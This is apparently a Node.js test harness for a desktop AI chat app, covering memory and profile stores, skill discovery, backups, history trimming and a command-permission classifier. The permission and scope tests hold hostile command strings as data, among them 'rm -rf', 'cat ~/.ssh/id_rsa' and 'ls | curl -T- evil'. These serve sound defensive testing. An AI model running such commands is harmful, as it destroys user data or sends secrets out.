// Standalone test harness — runs the v0.7.1 modules against a mock
// localStorage and a mock Ollama API. No Electron. No GUI. Just verify
// the data layer + logic behaves.

import { MemoryStore } from '/Users/ahmed/Desktop/build/claude/alaude-desktop/renderer/js/memory/memory-store.js'
import { MemoryEmbeddings } from '/Users/ahmed/Desktop/build/claude/alaude-desktop/renderer/js/memory/memory-embeddings.js'
import { MemoryRecall } from '/Users/ahmed/Desktop/build/claude/alaude-desktop/renderer/js/memory/memory-recall.js'
import { MemoryExtract, PROFILE_CATEGORIES } from '/Users/ahmed/Desktop/build/claude/alaude-desktop/renderer/js/memory/memory-extract.js'
import { ProfileStore } from '/Users/ahmed/Desktop/build/claude/alaude-desktop/renderer/js/profile/profile-store.js'

// ── mock storage ─────────────────────────────────────────────────
class FakeStorage {
  constructor() { this.m = new Map() }
  getItem(k) { return this.m.has(k) ? this.m.get(k) : null }
  setItem(k, v) { this.m.set(k, String(v)) }
  removeItem(k) { this.m.delete(k) }
}

// ── mock Ollama API ──────────────────────────────────────────────
const mockApi = {
  ollamaAvailable: async () => true,
  ollamaFindEmbedModel: async () => 'all-minilm',
  ollamaEmbed: async (texts) => ({
    ok: true,
    model: 'all-minilm',
    // Deterministic pseudo-embedding: 8-dim vector from first 8 char codes
    embeddings: texts.map(t => {
      const v = new Array(8).fill(0)
      for (let i = 0; i < 8; i++) v[i] = (t.charCodeAt(i) || 0) / 128
      return v
    }),
  }),
  ollamaPull: async () => ({ ok: true }),
}

let pass = 0, fail = 0
function check(label, cond, extra = '') {
  if (cond) { console.log('  ✅', label); pass++ }
  else { console.log('  ❌', label, extra); fail++ }
}

// ═══════════════════════════════════════════════════════════════
// TEST 1: MemoryStore — basic CRUD + dedup + scope
// ═══════════════════════════════════════════════════════════════
console.log('\n[1/13] MemoryStore — basic CRUD + scope')
{
  const storage = new FakeStorage()
  const store = new MemoryStore({ storage })

  check('starts empty', store.size() === 0)

  const a = store.add('I prefer Vue', null, { scope: 'global' })
  check('add returns entry with id', a && a.id.startsWith('mem_'))
  check('add assigns scope=global', a.scope === 'global')
  check('add with workspace assigns path',
    store.add('project fact', null, { scope: 'workspace', workspacePath: '/tmp/proj' })?.workspacePath === '/tmp/proj')

  const dup = store.add('I prefer Vue', null, { scope: 'global' })
  check('dedup returns null on same text', dup === null)

  check('size is 2 after one dup', store.size() === 2)

  const persisted = JSON.parse(storage.getItem('alaude:memory:v1'))
  check('save persists to storage', Array.isArray(persisted) && persisted.length === 2)

  // Reload fresh instance and verify it reads what we wrote
  const store2 = new MemoryStore({ storage })
  check('fresh instance reads persisted data', store2.size() === 2)

  const edited = store.edit(a.id, 'I prefer Svelte now')
  check('edit returns true', edited === true)
  check('edit updates text', store.find(a.id).text === 'I prefer Svelte now')

  store.remove(a.id)
  check('remove drops entry', store.size() === 1)
}

// ═══════════════════════════════════════════════════════════════
// TEST 2: MemoryStore — visiblePool scope filter
// ═══════════════════════════════════════════════════════════════
console.log('\n[2/13] MemoryStore — scope filtering')
{
  const store = new MemoryStore({ storage: new FakeStorage() })
  store.add('global fact', null, { scope: 'global' })
  store.add('fact for project A', null, { scope: 'workspace', workspacePath: '/Users/test/projA' })
  store.add('fact for project B', null, { scope: 'workspace', workspacePath: '/Users/test/projB' })
  // Legacy entry (no scope field) — should be treated as global
  store.entries.push({ id: 'legacy_1', text: 'legacy fact', createdAt: Date.now() })
  store.save()

  const poolA = store.visiblePool('/Users/test/projA')
  check('visible pool in projA has global + projA + legacy',
    poolA.length === 3, `got ${poolA.length}, expected 3`)
  check('projA pool does NOT contain projB fact',
    !poolA.some(m => m.text === 'fact for project B'))

  const poolNone = store.visiblePool(null)
  check('visible pool with no workspace has only global + legacy',
    poolNone.length === 2, `got ${poolNone.length}, expected 2`)

  const poolB = store.visiblePool('/Users/test/projB')
  check('visible pool in projB sees projB but not projA',
    poolB.length === 3 && poolB.some(m => m.text === 'fact for project B') && !poolB.some(m => m.text === 'fact for project A'))

  // toggleScope behavior
  const entry = store.add('new workspace fact', null, { scope: 'workspace', workspacePath: '/Users/test/projA' })
  const newScope = store.toggleScope(entry.id, '/Users/test/projA')
  check('toggleScope workspace→global returns global', newScope === 'global')
  check('after toggle, workspacePath is null', store.find(entry.id).workspacePath === null)

  const backToWs = store.toggleScope(entry.id, '/Users/test/projA')
  check('toggleScope global→workspace returns workspace', backToWs === 'workspace')

  // Edge: toggling global→workspace with null workspace returns null
  const globalEntry = store.add('no-ws attempt', null, { scope: 'global' })
  const blocked = store.toggleScope(globalEntry.id, null)
  check('toggleScope blocked when no workspace active', blocked === null)
}

// ═══════════════════════════════════════════════════════════════
// TEST 3: ProfileStore — store + grouping + system block
// ═══════════════════════════════════════════════════════════════
console.log('\n[3/13] ProfileStore — CRUD + grouping + system block')
{
  const storage = new FakeStorage()
  const profile = new ProfileStore({ storage })

  check('starts empty + not onboarded', profile.size() === 0 && profile.shouldShowOnboarding())
  check('getSystemBlock returns empty when no entries', profile.getSystemBlock() === '')

  profile.add('Call me Ahmed', 'identity')
  profile.add('Main stack: Electron, JS', 'tools')
  profile.add('Prefer async/await', 'preferences')
  profile.add('Timezone UTC+3', 'context')

  check('size is 4 after 4 adds', profile.size() === 4)

  const groups = profile.groupedByCategory()
  check('groupedByCategory returns 4 groups', groups.length === 4)
  check('groups ordered identity → preferences → tools → context',
    groups.map(g => g.category).join(',') === 'identity,preferences,tools,context')

  const block = profile.getSystemBlock()
  check('system block wrapped in <user-profile> tags',
    block.startsWith('<user-profile>\n') && block.endsWith('</user-profile>\n\n'))
  check('system block contains the identity fact',
    block.includes('Call me Ahmed'))
  check('system block strips emoji prefix from category label',
    block.includes('[Identity]') && !block.includes('[👤 Identity]'))

  // onboarding state
  profile.markOnboarded()
  check('markOnboarded flips flag', !profile.shouldShowOnboarding())

  // 20-entry cap
  for (let i = 0; i < 25; i++) profile.add(`filler fact ${i}`, 'context')
  check('cap enforced at 20 entries', profile.size() === 20, `got ${profile.size()}`)

  // dedup
  const dup = profile.add('Call me Ahmed', 'identity')
  check('profile dedup returns null', dup === null)
}

// ═══════════════════════════════════════════════════════════════
// TEST 4: MemoryExtract — regex + candidates
// ═══════════════════════════════════════════════════════════════
console.log('\n[4/13] MemoryExtract — patterns + candidates')
{
  const cases = [
    { text: 'My name is Ahmed', expect: 'Name: Ahmed', cat: 'identity', promotes: true },
    { text: 'I prefer Vue over React', expect: 'Prefers Vue over React', cat: 'preferences', promotes: true },
    { text: 'I use Python and Go', expect: 'Uses Python and Go', cat: 'tools', promotes: true },
    { text: "I'm building a chat app", expect: 'Working on a chat app', cat: 'context', promotes: false },
    { text: 'Remember that coffee is life', expect: 'coffee is life', cat: null, promotes: false },
  ]

  for (const c of cases) {
    const facts = MemoryExtract.extract(c.text)
    const matched = facts.some(f => f === c.expect)
    check(`extract("${c.text}") → "${c.expect}"`, matched, `got ${JSON.stringify(facts)}`)

    if (c.cat) {
      const cands = MemoryExtract.extractProfileCandidates(c.text, [])
      const hasCand = cands.some(x => x.text === c.expect && x.category === c.cat)
      if (c.promotes) {
        check(`${c.cat} candidate emitted for promotion`, hasCand)
      } else {
        check(`non-promote pattern did NOT emit candidate`, cands.length === 0 || !hasCand)
      }
    }
  }

  // Existing-profile filter
  const existing = [{ text: 'prefers vue over react', category: 'preferences' }]
  const cands = MemoryExtract.extractProfileCandidates('I prefer Vue over React', existing)
  check('existing profile facts filter out duplicate candidates', cands.length === 0)
}

// ═══════════════════════════════════════════════════════════════
// TEST 5: MemoryEmbeddings — cosine + backfill
// ═══════════════════════════════════════════════════════════════
console.log('\n[5/13] MemoryEmbeddings — cosine + backfill loop')
{
  const store = new MemoryStore({ storage: new FakeStorage() })
  const emb = new MemoryEmbeddings({ store, api: mockApi })

  check('cosine of identical vectors ≈ 1',
    Math.abs(MemoryEmbeddings.cosine([1, 0, 0], [1, 0, 0]) - 1) < 0.0001)
  check('cosine of orthogonal vectors = 0',
    MemoryEmbeddings.cosine([1, 0, 0], [0, 1, 0]) === 0)
  check('cosine of mismatched dims = 0',
    MemoryEmbeddings.cosine([1, 0], [1, 0, 0]) === 0)

  store.add('apple banana', null, { scope: 'global' })
  store.add('apricot berry', null, { scope: 'global' })
  store.add('zebra xylophone', null, { scope: 'global' })

  const r = await emb.ensureAll()
  check('ensureAll completes against mock ollama', r.started === true, JSON.stringify(r))
  check('all entries got embeddings', store.embeddedCount() === 3)

  // second call → nothing to do
  const r2 = await emb.ensureAll()
  check('re-running ensureAll skips (already-indexed)', r2.started === false && r2.reason === 'all-indexed')
}

// ═══════════════════════════════════════════════════════════════
// TEST 6: MemoryRecall — scoring + profile injection
// ═══════════════════════════════════════════════════════════════
console.log('\n[6/13] MemoryRecall — scoring + injection')
{
  const store = new MemoryStore({ storage: new FakeStorage() })
  const emb = new MemoryEmbeddings({ store, api: mockApi })
  let incog = false
  const recall = new MemoryRecall({
    store, embeddings: emb,
    getIncognito: () => incog,
    getCurrentWorkspace: () => null,
  })

  store.add('User prefers dark mode', null, { scope: 'global' })
  store.add('User uses Python for ML', null, { scope: 'global' })
  store.add('User is a developer', null, { scope: 'global' })

  // Keyword mode only
  store.setRecallMode('keyword')
  const kwHits = await recall.recall('What does the user prefer about mode settings?', 5)
  check('keyword recall returns at least one hit',
    kwHits.length >= 1, `got ${kwHits.length}`)

  // Incognito should always return []
  incog = true
  const incogHits = await recall.recall('prefers anything', 5)
  check('incognito suppresses recall', incogHits.length === 0)
  incog = false

  // injectIntoLastUser — with profile block
  const messages = [
    { role: 'user', content: 'what do I prefer?' },
  ]
  const profileBlockBuilder = () => '<user-profile>\n- [Identity] Ahmed\n</user-profile>\n\n'
  const injected = await recall.injectIntoLastUser(messages, 'prefers', profileBlockBuilder)
  check('inject returns profileUsed=true when profile given', injected.profileUsed === true)
  check('injected message starts with <user-profile>',
    injected.msgs[0].content.startsWith('<user-profile>'))

  // Incognito kills profile injection too
  incog = true
  const injectedIncog = await recall.injectIntoLastUser(messages, 'prefers', profileBlockBuilder)
  check('incognito blocks profile injection',
    injectedIncog.profileUsed === false)
}

// ═══════════════════════════════════════════════════════════════
// TEST 7: folder-skills — discovery, frontmatter, guards
// (CJS module; loaded with LABAIK_HOME pointed at a temp dir so the
// test never touches ~/.labaik.)
// ═══════════════════════════════════════════════════════════════
console.log('\n[7/13] folder-skills — discovery + frontmatter + guards')
{
  const { createRequire } = await import('node:module')
  const fs = await import('node:fs')
  const os = await import('node:os')
  const path = await import('node:path')
  const require = createRequire(import.meta.url)

  const testHome = fs.mkdtempSync(path.join(os.tmpdir(), 'labaik-test-'))
  process.env.LABAIK_HOME = testHome
  // paths.js caches BASE_DIR at load — must require AFTER setting the env.
  const folderSkills = require('../electron/folder-skills.js')

  check('discover returns [] when root missing', folderSkills.discover().length === 0)

  const mkSkill = (slug, content) => {
    fs.mkdirSync(path.join(testHome, 'skills', slug), { recursive: true })
    fs.writeFileSync(path.join(testHome, 'skills', slug, 'SKILL.md'), content)
  }
  mkSkill('pr-polish', '---\nname: Polish a PR\ndescription: Clean up a PR body\n---\n\nRewrite the PR description…')
  mkSkill('no-front', 'Just a body, no frontmatter.')
  fs.mkdirSync(path.join(testHome, 'skills', 'empty-dir'))  // no SKILL.md — ignored

  const found = folderSkills.discover()
  check('discovers 2 skills (ignores empty dir)', found.length === 2, `got ${found.length}`)
  const pr = found.find(s => s.slug === 'pr-polish')
  check('frontmatter name parsed', pr?.name === 'Polish a PR')
  check('frontmatter description parsed', pr?.description === 'Clean up a PR body')
  check('body excludes frontmatter', pr?.body.startsWith('Rewrite the PR description'))
  check('no-frontmatter slug becomes name', found.find(s => s.slug === 'no-front')?.name === 'no-front')

  check('get() loads by slug', folderSkills.get('pr-polish')?.name === 'Polish a PR')
  check('get() rejects path traversal', folderSkills.get('../outside') === null)
  check('get() unknown slug → null', folderSkills.get('nope') === null)

  // Cycle 33 — SKILL.md open-standard interop: skills in other tools'
  // standard dirs (redirected into the sandbox under LABAIK_HOME) are
  // discovered read-only; Labaik-native wins on slug collision.
  const stdDir = path.join(testHome, '__std_claude_skills__')
  fs.mkdirSync(path.join(stdDir, 'cc-skill'), { recursive: true })
  fs.writeFileSync(path.join(stdDir, 'cc-skill', 'SKILL.md'), '---\nname: From Claude Code\ndescription: ecosystem skill\n---\nDo the thing.')
  fs.mkdirSync(path.join(stdDir, 'pr-polish'), { recursive: true })
  fs.writeFileSync(path.join(stdDir, 'pr-polish', 'SKILL.md'), '---\nname: SHOULD LOSE\n---\nx')
  const found2 = folderSkills.discover()
  check('interop skill discovered with source tag', found2.find(s => s.slug === 'cc-skill')?.source === 'claude')
  check('labaik wins on slug collision', found2.find(s => s.slug === 'pr-polish')?.name === 'Polish a PR')
  check('get() resolves interop slug', folderSkills.get('cc-skill')?.body === 'Do the thing.')

  // Starter skills (v0.8 general-use)
  const first = folderSkills.installStarters()
  check('installStarters installs all bundled skills',
    first.installed.length === folderSkills.STARTER_SKILLS.length && first.skipped.length === 0)
  check('starter skill discoverable with parsed frontmatter',
    folderSkills.get('meeting-notes')?.description.includes('action items'))
  // Idempotency: user edits must survive a re-install.
  fs.writeFileSync(path.join(testHome, 'skills', 'trip-planner', 'SKILL.md'), '---\nname: Mine\n---\nedited')
  const second = folderSkills.installStarters()
  check('re-install skips everything (idempotent)', second.installed.length === 0)
  check('user-edited starter not overwritten', folderSkills.get('trip-planner')?.name === 'Mine')

  const { meta, body } = folderSkills._parseFrontmatter('---\nName: "Quoted"\n---\nbody')
  check('frontmatter keys lowercase + quotes stripped', meta.name === 'Quoted' && body === 'body')

  // ═══ TEST 8: routines — cron parse + legacy shape ═══
  console.log('\n[8/13] routines — cron parsing + legacy skills.json shape')
  const routines = require('../electron/routines.js')
  check('parses standard cron', routines._parseCron('0 8 * * *') !== null)
  check('rejects 4-field cron', routines._parseCron('0 8 * *') === null)
  const next = routines._nextFire('*/15 * * * *', Date.now())
  check('nextFire lands within 15 min', next !== null && next - Date.now() <= 15 * 60 * 1000)
  // Legacy shape: a migrated skills.json still loads.
  fs.writeFileSync(path.join(testHome, 'routines.json'),
    JSON.stringify({ version: 1, skills: [{ id: 'sk_1', name: 'Old', prompt: 'p', cron: '0 8 * * *', enabled: true }] }))
  const listed = routines.list()
  check('legacy {skills:[…]} shape accepted', listed.length === 1 && listed[0].name === 'Old')
  routines.upsert({ name: 'New one', prompt: 'p2', cron: '0 9 * * *' })
  const onDisk = JSON.parse(fs.readFileSync(path.join(testHome, 'routines.json'), 'utf8'))
  check('save writes routines key (not skills)', Array.isArray(onDisk.routines) && onDisk.routines.length === 2 && !onDisk.skills)
  check('new ids use rt_ prefix', onDisk.routines[1].id.startsWith('rt_'))

  // ═══ TEST 9: ChatGPT import converter ═══
  console.log('\n[9/13] import-chatgpt — mapping linearization')
  const { convertChatGPTExport, fingerprint } = require('../electron/import-chatgpt.js')
  const mkExport = () => ([{
    title: 'Test conv', create_time: 1700000000, current_node: 'n3',
    mapping: {
      n0: { id: 'n0', parent: null, children: ['n1'], message: { author: { role: 'system' }, content: { parts: ['sys'] } } },
      n1: { id: 'n1', parent: 'n0', children: ['n2'], message: { author: { role: 'user' }, content: { parts: ['hello'] }, create_time: 1700000001 } },
      n2: { id: 'n2', parent: 'n1', children: ['n3'], message: { author: { role: 'assistant' }, content: { parts: ['hi there'] }, create_time: 1700000002 } },
      n3: { id: 'n3', parent: 'n2', children: [], message: { author: { role: 'user' }, content: { parts: ['bye'] } } },
    },
  }, { title: 'Empty', current_node: 'x', mapping: {} }])
  const conv = convertChatGPTExport(mkExport())
  check('converts the active thread in order',
    conv.ok && conv.sessions.length === 1 &&
    conv.sessions[0].messages.map(m => m.content).join('|') === 'hello|hi there|bye')
  check('system messages dropped', !conv.sessions[0].messages.some(m => m.role !== 'user' && m.role !== 'assistant'))
  check('empty conversation skipped, counted', conv.skipped === 1)
  check('wrapped {conversations:[...]} accepted', convertChatGPTExport({ conversations: mkExport() }).ok)
  check('garbage input rejected gracefully', convertChatGPTExport({ nope: 1 }).ok === false)
  // Cycle 39: dedup fingerprints. Same export → identical fps (stable);
  // different content → different fp; converter stamps fp on each session.
  check('converter stamps a fingerprint', typeof conv.sessions[0].fp === 'string' && conv.sessions[0].fp.length > 0)
  check('re-converting the same export yields identical fingerprints',
    convertChatGPTExport(mkExport()).sessions[0].fp === conv.sessions[0].fp)
  check('different conversation → different fingerprint',
    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }] }) !==
    fingerprint({ title: 'B', messages: [{ role: 'user', content: 'x' }] }))
  check('fingerprint reflects message count',
    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }] }) !==
    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }, { role: 'assistant', content: 'y' }] }))

  // ═══ TEST 10: backup round-trip ═══
  console.log('\n[10/13] backup — export/import round-trip, keys excluded')
  const backup = require('../electron/backup.js')
  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [{ id: 1, title: 'keep me' }] }))
  fs.writeFileSync(path.join(testHome, 'credentials.json'), JSON.stringify({ secret: 'sk-DO-NOT-EXPORT' }))
  const bundle = backup.exportBundle({ snippets: ['x'] })
  check('bundle carries sessions', bundle.files['sessions.json']?.sessions?.[0]?.title === 'keep me')
  check('bundle carries skills', bundle.skills.some(sk => sk.slug === 'pr-polish'))
  check('credentials NEVER exported', !JSON.stringify(bundle).includes('sk-DO-NOT-EXPORT'))
  check('renderer extras ride along', bundle.renderer?.snippets?.[0] === 'x')
  // Mutate, then restore
  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [] }))
  const imp = backup.importBundle(bundle)
  check('import restores sessions', imp.ok && JSON.parse(fs.readFileSync(path.join(testHome, 'sessions.json'), 'utf8')).sessions[0].title === 'keep me')
  check('overwritten file backed up first', fs.readdirSync(testHome).some(f => f.startsWith('sessions.json.pre-import-')))
  check('garbage bundle rejected', backup.importBundle({ nope: 1 }).ok === false)
  check('future-version bundle rejected', backup.importBundle({ kind: 'labaik-backup', version: 99 }).ok === false)

  // Cycle 29: non-destructive merge. Local has a session the bundle lacks +
  // an older copy of a shared one; restore must keep the local-only session
  // and take the bundle's more-complete copy of the shared one.
  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [
    { id: 1, title: 'keep me', messages: [{ role: 'user', content: 'a' }] },
    { id: 2, title: 'local only', messages: [{ role: 'user', content: 'mine' }] },
  ] }))
  const mergeBundle = { kind: 'labaik-backup', version: 1, files: { 'sessions.json': { v: 1, sessions: [
    { id: 1, title: 'keep me', messages: [{ role: 'user', content: 'a' }, { role: 'assistant', content: 'b' }] },
    { id: 3, title: 'from backup', messages: [{ role: 'user', content: 'c' }] },
  ] } }, skills: [] }
  const merged = backup.importBundle(mergeBundle)
  const after = JSON.parse(fs.readFileSync(path.join(testHome, 'sessions.json'), 'utf8')).sessions
  check('merge keeps local-only session', after.some(s => s.id === 2 && s.title === 'local only'))
  check('merge adds backup-only session', after.some(s => s.id === 3))
  check('merge takes the more-complete shared copy', after.find(s => s.id === 1)?.messages.length === 2)
  check('merge reports new session count', merged.mergedSessions === 1)

  // Cycle 31: the same union-by-id now covers memory, profile, routines.
  fs.writeFileSync(path.join(testHome, 'memory.json'), JSON.stringify({ entries: [{ id: 'm1', text: 'local memory' }] }))
  fs.writeFileSync(path.join(testHome, 'profile.json'), JSON.stringify({ entries: [{ id: 'p1', text: 'local pref' }], onboarded: true }))
  fs.writeFileSync(path.join(testHome, 'routines.json'), JSON.stringify({ version: 1, routines: [{ id: 'r1', name: 'local routine' }] }))
  const mergeBundle2 = { kind: 'labaik-backup', version: 1, files: {
    'memory.json': { entries: [{ id: 'm2', text: 'backup memory' }] },
    'profile.json': { entries: [{ id: 'p2', text: 'backup pref' }], onboarded: false },
    'routines.json': { version: 1, routines: [{ id: 'r1', name: 'CHANGED elsewhere' }, { id: 'r2', name: 'backup routine' }] },
  }, skills: [] }
  check('cycle-31 merge import ok', backup.importBundle(mergeBundle2).ok === true)
  const mem2 = JSON.parse(fs.readFileSync(path.join(testHome, 'memory.json'), 'utf8')).entries
  check('memory union keeps local + adds backup', mem2.some(e => e.id === 'm1') && mem2.some(e => e.id === 'm2'))
  const prof2 = JSON.parse(fs.readFileSync(path.join(testHome, 'profile.json'), 'utf8'))
  check('profile union keeps local + adds backup', prof2.entries.some(e => e.id === 'p1') && prof2.entries.some(e => e.id === 'p2'))
  check('onboarded never regresses to false', prof2.onboarded === true)
  const rout2 = JSON.parse(fs.readFileSync(path.join(testHome, 'routines.json'), 'utf8')).routines
  check('routine conflict: local wins', rout2.find(r => r.id === 'r1')?.name === 'local routine')
  check('routine union adds backup-only', rout2.some(r => r.id === 'r2'))

  // ═══ TEST 11: conversation history budget ═══
  console.log('\n[11/13] history-budget — cap, keep-recent, trim note')
  const { capHistory } = await import('../renderer/js/history-budget.js')
  const mk = (n, len) => Array.from({ length: n }, (_, i) => ({ role: i % 2 ? 'assistant' : 'user', content: 'x'.repeat(len) }))
  // Under budget → unchanged (new array)
  const small = mk(6, 100)
  const r1 = capHistory(small, 240000)
  check('under-budget history passes through unchanged', r1.length === 6 && r1 !== small && r1[0].content === small[0].content)
  // ≤ minKeep always passes
  check('<=minKeep history never trimmed', capHistory(mk(3, 999999), 10).length === 3)
  // Over budget → trims oldest, prepends note, keeps newest
  const big = mk(50, 10000)  // 500k chars
  big[49].content = 'NEWEST'
  const r2 = capHistory(big, 100000, 4)
  check('over-budget history is trimmed', r2.length < 50)
  check('trim keeps the newest message', r2[r2.length - 1].content === 'NEWEST')
  check('trim prepends a note', r2[0].role === 'user' && r2[0].content.includes('trimmed'))
  check('note reports a plausible dropped count', /\d+ earlier message/.test(r2[0].content))
  // Always keeps at least minKeep even if each is oversize
  check('keeps >= minKeep huge messages', capHistory(mk(10, 500000), 100000, 4).filter(m => m.content.length === 500000).length >= 4)
  // Never mutates input
  check('input array not mutated', big.length === 50)

  // ═══ TEST 12: MCP tool-name parser ═══
  console.log('\n[12/13] mcp — tool-name parsing')
  const { parseMcpToolName } = require('../electron/mcp.js')
  const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b)
  check('parses simple name', eq(parseMcpToolName('mcp_fs__read_file'), { serverName: 'fs', toolName: 'read_file' }))
  check('server name with underscore', eq(parseMcpToolName('mcp_my_server__do_thing'), { serverName: 'my_server', toolName: 'do_thing' }))
  check('tool name with double underscore (splits on first __)', eq(parseMcpToolName('mcp_gh__list__repos'), { serverName: 'gh', toolName: 'list__repos' }))
  check('rejects non-mcp prefix', parseMcpToolName('notmcp_x__y') === null)
  check('rejects empty server', parseMcpToolName('mcp___y') === null)
  check('rejects empty tool', parseMcpToolName('mcp_fs__') === null)
  check('rejects non-string', parseMcpToolName(null) === null)

  // ═══ TEST 13: permissions — rm -rf detection across flag spellings ═══
  console.log('\n[13/13] permissions — dangerous rm detection')
  const perms = require('../electron/permissions.js')
  const rmClass = (c) => perms.classifyCommand(c).class
  check('rm -rf flagged', rmClass('rm -rf /tmp/x') === 'dangerous')
  check('rm -r -f (split) flagged', rmClass('rm -r -f ./build') === 'dangerous')
  check('rm --recursive --force flagged', rmClass('rm --recursive --force .') === 'dangerous')
  check('rm -f -r (reordered) flagged', rmClass('rm -f -r data') === 'dangerous')
  check('rm -fr (combined alt) flagged', rmClass('rm -fr x') === 'dangerous')
  check('chained rm -r -f flagged', rmClass('echo hi && rm -r -f ./node_modules') === 'dangerous')
  check('rm with force only NOT flagged', rmClass('rm --force ./file') !== 'dangerous')
  check('rm recursive only NOT flagged', rmClass('rm -r ./dir') !== 'dangerous')
  check('rm of a single file NOT flagged', rmClass('rm file.txt') !== 'dangerous')
  check('word containing rm NOT flagged', rmClass('confirm-rm script') !== 'dangerous')
  check('isDangerousRm exported + works', perms.isDangerousRm('rm -r -f x') === true && perms.isDangerousRm('ls') === false)

  // ═══ command-scope guard (cycle 46) ═══
  const { checkCommandScope } = require('../electron/command-scope.js')
  const home2 = os.homedir()
  const ws = home2 + '/proj'
  const blocked = (c) => checkCommandScope(c, ws).ok === false
  check('cd .. escape blocked', blocked('cd ../etc'))
  check('cd / blocked', blocked('cd /'))
  check('cd ~ escape blocked', blocked('cd ~ && cat secret'))
  check('cd $HOME escape blocked', blocked('cd $HOME/.ssh'))
  check('pushd .. blocked', blocked('pushd ..'))
  check('reading ~/.ssh blocked', blocked('cat ~/.ssh/id_rsa'))
  check('bare cd (→home) blocked', blocked('cd'))
  check('in-scope ~/proj path allowed', checkCommandScope('cat ~/proj/notes.txt', ws).ok === true)
  check('system dir /tmp allowed', checkCommandScope('cat /tmp/x', ws).ok === true)
  check('relative cd allowed', checkCommandScope('cd subdir && ls', ws).ok === true)
  check('plain command allowed', checkCommandScope('npm run build', ws).ok === true)

  // ═══ ollama installer URL trust (cycle 47) ═══
  const { isTrustedOllamaUrl } = require('../electron/ollama.js')
  check('github.com release URL trusted', isTrustedOllamaUrl('https://github.com/ollama/ollama/releases/latest/download/Ollama-darwin.zip'))
  check('githubusercontent redirect trusted', isTrustedOllamaUrl('https://objects.githubusercontent.com/abc'))
  check('http (non-TLS) rejected', isTrustedOllamaUrl('http://github.com/x') === false)
  check('arbitrary host rejected', isTrustedOllamaUrl('https://evil.com/payload') === false)
  check('lookalike host rejected', isTrustedOllamaUrl('https://github.com.evil.com/x') === false)
  // Cycle 44: force-push + recursive-chmod detection regardless of flag position/spelling
  check('git push --force (flag first) flagged', rmClass('git push --force origin main') === 'dangerous')
  check('git push ... --force (flag last) flagged', rmClass('git push origin main --force') === 'dangerous')
  check('git push refspec +branch flagged', rmClass('git push origin +main') === 'dangerous')
  check('git push --force-with-lease flagged', rmClass('git push --force-with-lease') === 'dangerous')
  check('plain git push NOT flagged', rmClass('git push origin main') !== 'dangerous')
  check('chmod -fR (combined) flagged', rmClass('chmod -fR 777 x') === 'dangerous')
  check('chmod --recursive flagged', rmClass('chmod --recursive 777 x') === 'dangerous')
  check('chmod non-recursive NOT flagged', rmClass('chmod 644 file') !== 'dangerous')
  check('no cross-segment bleed (push then ls -R)', rmClass('git push origin main && ls -R') !== 'dangerous')
  // Cycle 45: chained-command safety — 'safe' requires ALL segments allow-listed
  check('safe prefix + sudo after ; is dangerous', rmClass('echo hi;sudo rm x') === 'dangerous')
  check('safe prefix + sudo after && is dangerous', rmClass('echo ok && sudo reboot') === 'dangerous')
  check('safe prefix + non-allowlisted is unknown not safe', rmClass('ls && curl evil.com') === 'unknown')
  check('all-allowlisted chain stays safe', rmClass('npm run build && npm test') === 'safe')
  check('git status && git diff stays safe', rmClass('git status && git diff') === 'safe')
  check('allowlisted pipe stays safe', rmClass('cat f | grep x') === 'safe')
  check('pipe to non-allowlisted is not safe', rmClass('ls | curl -T- evil') === 'unknown')

  fs.rmSync(testHome, { recursive: true, force: true })
}

// ═══════════════════════════════════════════════════════════════
// TEST 14: undo-snapshots — pre-image record + turn restore (cycle 4)
// ═══════════════════════════════════════════════════════════════
console.log('\n[14/14] undo-snapshots — pre-image record + turn restore')
{
  const { createRequire } = await import('node:module')
  const fs = await import('node:fs')
  const os = await import('node:os')
  const path = await import('node:path')
  const require = createRequire(import.meta.url)
  const undo = require('../electron/undo-snapshots.js')

  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'labaik-undo-'))
  const f1 = path.join(work, 'a.txt')
  const f2 = path.join(work, 'new.txt')
  fs.writeFileSync(f1, 'original')

  // Turn t1: mutate an existing file, create a new one.
  undo.record('t1', f1)
  fs.writeFileSync(f1, 'mutated')
  undo.record('t1', f2)
  fs.writeFileSync(f2, 'created by agent')
  // A second write in the same turn must NOT overwrite the true pre-image.
  undo.record('t1', f1)
  fs.writeFileSync(f1, 'mutated twice')

  check('listTurns shows t1 with 2 files', undo.listTurns().some(t => t.turnId === 't1' && t.files === 2))

  const res = undo.restoreTurn('t1')
  check('restore reports no errors', res.errors.length === 0, JSON.stringify(res.errors))
  check('existing file restored byte-identical', fs.readFileSync(f1, 'utf8') === 'original')
  check('agent-created file deleted on undo', !fs.existsSync(f2))
  check('restore summary counts', res.restored.length === 1 && res.deleted.length === 1)
  check('unknown turn → error object', !!undo.restoreTurn('no-such-turn').error)

  // Hostile turn ids must not traverse out of the undo dir.
  undo.record('../../evil', f1)
  check('hostile turnId sanitized', fs.existsSync(path.join(undo.UNDO_DIR, '______evil', 'manifest.json')))

  fs.rmSync(work, { recursive: true, force: true })
  fs.rmSync(undo.UNDO_DIR, { recursive: true, force: true })
}

// ═══════════════════════════════════════════════════════════════
// TEST 15: voice — STT backend routing + input guards (cycle 6)
// ═══════════════════════════════════════════════════════════════
console.log('\n[15/15] voice — STT backend routing + input guards')
{
  const { createRequire } = await import('node:module')
  const require = createRequire(import.meta.url)
  const voice = require('../electron/voice.js')

  const keys = (map) => (provider) => map[provider] || null

  check('openai preferred when both keys', voice.pickBackend(keys({ openai: 'sk-x', google: 'g-x' })) === 'openai')
  check('google when only google key', voice.pickBackend(keys({ google: 'g-x' })) === 'google')
  check('null when no keys', voice.pickBackend(keys({})) === null)
  check('throwing key lookup → null, no crash', voice.pickBackend(() => { throw new Error('boom') }) === null)

  const r1 = await voice.transcribe({ buffer: Buffer.alloc(0), mime: 'audio/webm', getApiKey: keys({ openai: 'k' }) })
  check('empty audio rejected', r1.error === 'empty-audio')
  const r2 = await voice.transcribe({ buffer: Buffer.alloc(voice.MAX_AUDIO_BYTES + 1), mime: 'audio/webm', getApiKey: keys({ openai: 'k' }) })
  check('oversize audio rejected', r2.error === 'too-large')
  const r3 = await voice.transcribe({ buffer: Buffer.from('x'), mime: 'audio/webm', getApiKey: keys({}) })
  check('no key → no-backend', r3.error === 'no-backend')
